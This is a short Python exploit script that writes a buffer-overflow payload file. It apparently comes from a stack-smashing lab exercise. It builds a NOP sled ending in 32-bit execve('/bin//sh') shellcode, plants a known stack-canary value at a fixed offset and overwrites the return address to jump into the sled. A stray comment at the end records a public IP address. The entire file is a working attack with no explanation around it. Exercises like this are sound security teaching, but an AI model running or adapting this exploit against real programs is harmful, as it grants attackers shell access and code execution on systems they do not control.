import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1370)) 
# Put the shellcode at the end 
start = 1370 - len(shellcode) 
content[start:] = shellcode

canary =0xDEADBEEF
# Here, 685 = &canary-&buffer
content[685:689] = (canary).to_bytes(4,byteorder='little') 
 
# Put the address at offset 701 
ret = 0xffffcdc8 + 250 
content[701:705] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

#publice ip:135.235.136.195
